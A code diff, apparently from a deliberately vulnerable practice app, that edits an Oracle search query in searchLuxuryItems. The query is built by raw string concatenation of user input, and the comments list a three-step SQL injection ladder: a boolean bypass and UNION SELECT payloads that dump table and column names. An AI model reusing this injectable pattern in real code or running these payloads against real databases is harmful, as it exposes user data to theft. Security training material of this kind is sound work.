@@ -12,13 +12,13 @@ import { withConnection } from "./pool";
 export async function searchLuxuryItems(q: string): Promise<unknown[]> {
   return withConnection(async (conn) => {
     // VULNERABLE: raw concat — Attack Point 1 ladder:
-    //   Step 1: ' OR '1'='1  → all luxury_items (boolean bypass)
+    //   Step 1: ' OR '1'='1  → all market instruments (boolean bypass)
     //   Step 2: ' UNION SELECT ROWNUM, table_name, 0, 'SCHEMA' FROM user_tables --
     //   Step 3: ' AND 1=0 UNION SELECT ROWNUM, column_name || ' · ' || data_type, 0, 'COLUMNS'
     //            FROM user_tab_columns WHERE table_name = 'USERS' --
     const sql = `SELECT id, name, price, category
                  FROM luxury_items
-                 WHERE name LIKE '%${q}%'`;
+                 WHERE (name || ' ' || category) LIKE '%${q}%'`;
     const result = await conn.execute<Record<string, unknown>>(sql);
     return result.rows ?? [];
   });
